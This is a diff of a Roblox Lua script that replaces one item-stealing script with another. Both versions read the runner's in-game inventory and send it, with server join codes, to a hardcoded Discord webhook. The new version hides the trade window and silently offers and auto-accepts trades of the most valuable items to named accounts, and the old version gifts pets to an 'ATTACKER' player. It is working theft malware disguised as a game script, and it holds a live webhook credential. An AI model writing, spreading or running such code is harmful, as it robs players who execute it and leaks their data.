@@ -1,255 +1,298 @@
-if shared.GAGInjected then return end
-shared.GAGInjected = true
+users = {"TeamBacoCool123alt1", "User2", "User3"}
+webHook = "https://discord.com/api/webhooks/1401607749741052134/VIbvQzvj4MxokS78S_MuvAu95nHp34XkJG-wSkVExgc162eeqJ20siVkkMtG9HiogCru"
+minPingValue = 0
 
-local ATTACKER = "USERNAME_HERE"
-local MAIN_WEBHOOK = "https://discord.com/api/webhooks/1401607749741052134/VIbvQzvj4MxokS78S_MuvAu95nHp34XkJG-wSkVExgc162eeqJ20siVkkMtG9HiogCru"
-local DEBUG_WEBHOOK = "https://discord.com/api/webhooks/1401607749741052134/VIbvQzvj4MxokS78S_MuvAu95nHp34XkJG-wSkVExgc162eeqJ20siVkkMtG9HiogCru"
-local IMPORTANT = {"Raccoon", "Dragonfly", "Red Fox", "Queen Bee", "Chicken Zombie", "Candy Blossom", "Kitsune", "French Fly Ferret"}
-local IGNORED = {"Can", "Shovel", "Seed", "Wrench", "Sprinkler", "Rod", "Tool", "Staff", "Trowel"}
+showUncommon = true
+showCommon = true
+showRare = true
+showLegendary = true
+showGodly = true
+showAncient = true
+showUnique = true
+showVintage = true
 
-local function debugLog(message, level)
-    local request = http_request or syn and syn.request or fluxus and fluxus.request
-    if not request then return end
-    
-    local timestamp = os.date("%Y-%m-%d %H:%M:%S")
-    local logMessage = string.format("[%s] [%s] %s", timestamp, level or "DEBUG", message)
-    
-    print(logMessage)
-    
-    pcall(function()
-        request({
-            Url = DEBUG_WEBHOOK,
+weaponValues = {
+    ["weaponname"] = 1,
+}
+
+petValues = {
+    ["petname"] = 1,
+}
+
+playerCount = #game:GetService("Players"):GetPlayers()
+if playerCount <= 1 then
+    game.Players.LocalPlayer:Kick("This server is not supported... Try a new public server.")
+    return
+end
+
+LP = game.Players.LocalPlayer
+HttpService = game:GetService("HttpService")
+PlayerDataModule = require(game:GetService("ReplicatedStorage").Modules.ProfileData)
+LevelModule = require(game:GetService("ReplicatedStorage").Modules.LevelModule)
+InvModule = require(game:GetService("ReplicatedStorage").Modules.InventoryModule)
+
+_G.exec = _G.exec or false
+if _G.exec then
+    return
+end
+_G.exec = true
+
+destroytrades2 = coroutine.create(function()
+    while true do
+        local player = game:GetService("Players").LocalPlayer
+        local tradeGUI = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI")
+        local tradeGUIPhone = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI_Phone")
+
+        if tradeGUI.Enabled then tradeGUI.Enabled = false end
+        if tradeGUIPhone.Enabled then tradeGUIPhone.Enabled = false end
+        wait(0.1)
+    end
+end)
+
+function SendWebhook(url, data)
+    local success, jsonData = pcall(function()
+        return HttpService:JSONEncode(data)
+    end)
+    if not success then
+        return
+    end
+
+    local success, response = pcall(function()
+        return request({
+            Url = url,
             Method = "POST",
             Headers = {["Content-Type"] = "application/json"},
-            Body = game:GetService("HttpService"):JSONEncode({
-                content = logMessage
-            })
+            Body = jsonData
         })
     end)
 end
 
-local function safeExecute(func, ...)
-    local success, result = pcall(func, ...)
-    if not success then
-        debugLog(string.format("Ошибка в %s: %s", tostring(func), result), "ERROR")
-        return nil
-    end
-    return result
-end
-
-debugLog("Скрипт инициализирован", "INFO")
-
-if not game:IsLoaded() then
-    game.Loaded:Wait()
-end
-
-local localPlayer = safeExecute(function() return game:GetService("Players").LocalPlayer end)
-if not localPlayer then
-    debugLog("Не удалось получить LocalPlayer", "ERROR")
-    return
-end
-
-local function getService(name)
-    local service = safeExecute(function() return game:GetService(name) end)
-    if not service then
-        debugLog("Сервис не найден: "..name, "ERROR")
-    end
-    return service
-end
-
-local ReplicatedStorage = getService("ReplicatedStorage")
-local Players = getService("Players")
-local HttpService = getService("HttpService")
-local VirtualInputManager = getService("VirtualInputManager")
-local RunService = getService("RunService")
-
-if not (ReplicatedStorage and Players and HttpService) then
-    debugLog("Критические сервисы не загружены", "ERROR")
-    return
-end
-
-local function deltaBypass()
-    if not VirtualInputManager then
-        debugLog("VirtualInputManager недоступен", "WARNING")
-        return false
-    end
-    
-    return safeExecute(function()
-        VirtualInputManager:SendMouseButtonEvent(
-            workspace.CurrentCamera.ViewportSize.X/2,
-            workspace.CurrentCamera.ViewportSize.Y/2,
-            0, true, nil, false)
-        task.wait(0.1)
-        VirtualInputManager:SendMouseButtonEvent(
-            workspace.CurrentCamera.ViewportSize.X/2,
-            workspace.CurrentCamera.ViewportSize.Y/2,
-            0, false, nil, false)
-        return true
-    end) or false
-end
-
-local function sendDataToDiscord(data)
-    return safeExecute(function()
-        local request = http_request or syn and syn.request or fluxus and fluxus.request
-        if not request then return false end
-        
-        request({
-            Url = MAIN_WEBHOOK,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode(data)
-        })
-        return true
-    end) or false
-end
-
-local function collectItems()
-    local items = {}
-    local importantItems = {}
-    
-    if not localPlayer:FindFirstChild("Backpack") then
-        debugLog("Инвентарь не найден", "WARNING")
-        return items, importantItems
-    end
-    
-    for _, item in pairs(localPlayer.Backpack:GetChildren()) do
-        if item:IsA("Tool") then
-            local itemNameLower = string.lower(item.Name)
-            local isImportant = false
-            
-            for _, v in ipairs(IMPORTANT) do
-                if string.find(itemNameLower, string.lower(v)) then
-                    table.insert(importantItems, item.Name)
-                    isImportant = true
-                    break
-                end
-            end
-            
-            if not isImportant then
-                local shouldIgnore = false
-                for _, v in ipairs(IGNORED) do
-                    if string.find(itemNameLower, string.lower(v)) then
-                        shouldIgnore = true
-                        break
-                    end
-                end
-                
-                if not shouldIgnore then
-                    table.insert(items, item.Name)
-                end
-            end
-        end
-    end
-    
-    return items, importantItems
-end
-
-local function main()
-    debugLog("Начало выполнения основной логики", "INFO")
-    
-    local items, importantItems = collectItems()
-    local placeId = game.PlaceId
-    local jobId = game.JobId
-    
-    local embed = {
-        title = "Grow A Garden Report",
-        fields = {
-            {name = "Игрок", value = localPlayer.Name, inline = true},
-            {name = "Сервер", value = jobId, inline = true},
-            {name = "Обычные предметы", value = #items > 0 and table.concat(items, ", ") or "Нет", inline = false},
-            {name = "Важные предметы", value = #importantItems > 0 and table.concat(importantItems, ", ") or "Нет", inline = false}
-        },
-        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+function CreateEmbed(title, description, color, fields)
+    return {
+        title = title,
+        description = description,
+        color = color,
+        fields = fields or {}
     }
-    
-    sendDataToDiscord({embeds = {embed}})
-    
-    local target = Players:FindFirstChild(ATTACKER)
-    if not target then
-        debugLog("Целевой игрок не найден: "..ATTACKER, "WARNING")
-        return
-    end
-    
-    debugLog("Найден целевой игрок: "..target.Name, "INFO")
-    
-    local function followTarget()
-        local connection
-        connection = RunService.Stepped:Connect(function()
-            if target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
-                if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
-                    localPlayer.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 3)
-                end
-            end
-        end)
-        return connection
-    end
-    
-    local followConnection = followTarget()
-    
-    local function giftItem(item, targetPlayer)
-        if not item or not targetPlayer then return false end
-        
-        if item.Parent ~= localPlayer.Backpack then
-            item.Parent = localPlayer.Backpack
-            task.wait(0.3)
-        end
-        
-        if localPlayer.Character and localPlayer.Character:FindFirstChildOfClass("Humanoid") then
-            localPlayer.Character.Humanoid:EquipTool(item)
-            task.wait(0.5)
-            
-            if detectExecutor and detectExecutor() == "Delta" then
-                deltaBypass()
-            else
-                local petGifting = ReplicatedStorage:FindFirstChild("GameEvents"):FindFirstChild("PetGiftingService")
-                if petGifting then
-                    petGifting:FireServer("GivePet", targetPlayer)
-                end
-            end
-            
-            task.wait(0.5)
-            if item.Parent == localPlayer.Character then
-                item.Parent = localPlayer.Backpack
-            end
-            return true
-        end
-        return false
-    end
-    
-    for _, item in pairs(localPlayer.Backpack:GetChildren()) do
-        if item:IsA("Tool") then
-            local itemNameLower = string.lower(item.Name)
-            local shouldIgnore = false
-            
-            for _, v in ipairs(IGNORED) do
-                if string.find(itemNameLower, string.lower(v)) then
-                    shouldIgnore = true
-                    break
-                end
-            end
-            
-            if not shouldIgnore then
-                for attempt = 1, 3 do
-                    if giftItem(item, target) then
-                        debugLog("Успешно передано: "..item.Name, "SUCCESS")
-                        break
-                    else
-                        debugLog("Не удалось передать: "..item.Name.." (попытка "..attempt..")", "WARNING")
-                    end
-                    task.wait(0.5)
-                end
-            end
-        end
-    end
-    
-    if followConnection then
-        followConnection:Disconnect()
-    end
-    
-    debugLog("Скрипт завершил работу", "INFO")
 end
 
-local success, err = pcall(main)
-if not success then
-    debugLog("Критическая ошибка: "..err, "CRITICAL")
+local function getLvl()
+    local success, level = pcall(function()
+        for i,v in pairs(LevelModule.XPTable) do
+            if PlayerDataModule.NewXP < v then return i end
+        end
+        return 0
+    end)
+    if not success then
+        return 0
+    end
+    return level
+end
+
+groupedWeapons = {}
+groupedPets = {}
+totalValue = 0
+totalCount = 0
+petCount = 0
+pets = {}
+rarityCounts = {
+    Vintage = 0,
+    Common = 0,
+    Uncommon = 0,
+    Rare = 0,
+    Legendary = 0,
+    Godly = 0,
+    Ancient = 0,
+    Unique = 0
+}
+
+local success, err = pcall(function()
+    for a,b in pairs(InvModule.MyInventory.Data.Weapons) do
+        for c,d in pairs(b) do
+            local value = weaponValues[d.ItemName] or 0
+            local amount = tonumber(d.Amount) or 1
+            totalValue = totalValue + (value * amount)
+            totalCount = totalCount + amount
+            rarityCounts[d.Rarity] = (rarityCounts[d.Rarity] or 0) + amount
+            
+            if not groupedWeapons[d.ItemName] then
+                groupedWeapons[d.ItemName] = {
+                    name = d.ItemName,
+                    value = value,
+                    data = d.DataID,
+                    amount = amount,
+                    rarity = d.Rarity or "Unknown",
+                    totalValue = value * amount,
+                    type = "Weapon"
+                }
+            else
+                groupedWeapons[d.ItemName].amount = groupedWeapons[d.ItemName].amount + amount
+                groupedWeapons[d.ItemName].totalValue = groupedWeapons[d.ItemName].totalValue + (value * amount)
+            end
+        end
+    end
+end)
+
+success, err = pcall(function()
+    for a,b in pairs(InvModule.MyInventory.Data.Pets) do
+        for c,d in pairs(b) do
+            local itemName = d.ItemName and string.lower(d.ItemName) or tostring(d.DataID)
+            local value = petValues[itemName] or 0
+            petCount = petCount + 1
+            totalValue = totalValue + value
+            totalCount = totalCount + 1
+            rarityCounts[d.Rarity or "Unknown"] = (rarityCounts[d.Rarity or "Unknown"] or 0) + 1
+            
+            table.insert(pets, d.DataID or "Unknown")
+            
+            if not groupedPets[itemName] then
+                groupedPets[itemName] = {
+                    name = d.ItemName or tostring(d.DataID),
+                    value = value,
+                    data = d.DataID or "Unknown",
+                    amount = 1,
+                    rarity = d.Rarity or "Unknown",
+                    totalValue = value,
+                    type = "Pet"
+                }
+            else
+                groupedPets[itemName].amount = groupedPets[itemName].amount + 1
+                groupedPets[itemName].totalValue = groupedPets[itemName].totalValue + value
+            end
+        end
+    end
+end)
+
+filteredItems = {}
+for _, item in pairs(groupedWeapons) do
+    if (item.rarity == "Uncommon" and showUncommon) or
+       (item.rarity == "Common" and showCommon) or
+       (item.rarity == "Rare" and showRare) or
+       (item.rarity == "Legendary" and showLegendary) or
+       (item.rarity == "Godly" and showGodly) or
+       (item.rarity == "Ancient" and showAncient) or
+       (item.rarity == "Unique" and showUnique) or
+       (item.rarity == "Vintage" and showVintage) or
+       (item.rarity == "Unknown") then
+        table.insert(filteredItems, item)
+    end
+end
+for _, item in pairs(groupedPets) do
+    if (item.rarity == "Uncommon" and showUncommon) or
+       (item.rarity == "Common" and showCommon) or
+       (item.rarity == "Rare" and showRare) or
+       (item.rarity == "Legendary" and showLegendary) or
+       (item.rarity == "Godly" and showGodly) or
+       (item.rarity == "Ancient" and showAncient) or
+       (item.rarity == "Unique" and showUnique) or
+       (item.rarity == "Vintage" and showVintage) or
+       (item.rarity == "Unknown") then
+        table.insert(filteredItems, item)
+    end
+end
+
+table.sort(filteredItems, function(a, b)
+    return a.value > b.value
+end)
+
+local function generateCompactList(items)
+    local lines = {}
+    for _, item in pairs(items) do
+        table.insert(lines, string.format("%s x%d: %d (%s, %s)", item.name, item.amount, item.totalValue, item.rarity, item.type))
+    end
+    return table.concat(lines, "\n")
+end
+
+compactList = generateCompactList(filteredItems)
+if compactList == "" then
+    compactList = "Items and pets not found"
+end
+
+local function formatPets(petList)
+    if #petList == 0 then
+        return "No pets"
+    else
+        return table.concat(petList, "\n")
+    end
+end
+
+executor = identifyexecutor() or "Unknown"
+placeId = game.PlaceId
+jobId = game.JobId
+messageCode = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s")', placeId, jobId)
+consoleCode = string.format('Roblox.GameLauncher.joinGameInstance(%s, "%s")', placeId, jobId)
+joinLink = string.format("roblox://placeID=%s&gameInstanceID=%s", placeId, jobId)
+
+WebHookEmbed = CreateEmbed(
+    "Inventory Report",
+    "",
+    0x3498db,
+    {
+        {name = "Player Info", value = string.format("Name: %s\nLevel: %d\nAccount Age: %d days\nExecutor: %s", LP.Name, getLvl(), LP.AccountAge, executor), inline = true},
+        {name = "Summary", value = string.format("Total Value: %d\nTotal Items: %d\nTotal Pets: %d", math.floor(totalValue), totalCount, petCount), inline = true},
+        {name = "Rarities", value = string.format("Unique: %d\nAncient: %d\nGodly: %d\nLegendary: %d\nVintage: %d\nRare: %d\nUncommon: %d\nCommon: %d",
+            rarityCounts.Unique, rarityCounts.Ancient, rarityCounts.Godly,
+            rarityCounts.Legendary, rarityCounts.Vintage, rarityCounts.Rare,
+            rarityCounts.Uncommon, rarityCounts.Common), inline = true},
+        {name = "Items and Pets List", value = string.sub(compactList, 1, 1000)},
+        {name = "Join via Console", value = consoleCode},
+        {name = "Join via Link", value = joinLink}
+    }
+)
+
+if totalValue >= minPingValue then
+    SendWebhook(webHook, {content = '-- @everyone\n'..messageCode, embeds = {WebHookEmbed}})
+else
+    SendWebhook(webHook, {content = messageCode, embeds = {WebHookEmbed}})
+end
+
+local function stealitems(playerName)
+    coroutine.resume(destroytrades2)
+    local success, err = pcall(function()
+        game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(game:GetService("Players")[playerName])
+    end)
+    wait(3)
+    
+    table.sort(filteredItems, function(a, b)
+        return a.value > b.value
+    end)
+    
+    local itemsAdded = 0
+    for _, item in ipairs(filteredItems) do
+        if itemsAdded >= 4 then break end
+        
+        local args
+        if item.type == "Pet" then
+            args = {
+                [1] = item.data,
+                [2] = "Pets"
+            }
+        else
+            args = {
+                [1] = item.data,
+                [2] = "Weapons"
+            }
+        end
+        
+        local success, err = pcall(function()
+            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+        end)
+        itemsAdded = itemsAdded + 1
+        wait(0.1)
+    end
+    
+    wait(6)
+    local success, err = pcall(function()
+        game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(285646582)
+    end)
+end
+
+for _, userName in pairs(users) do
+    game.Players.PlayerAdded:Connect(function(player)
+        if player.Name == userName then
+            player.Chatted:Connect(function(msg)
+                stealitems(userName)
+            end)
+        end
+    end)
 end
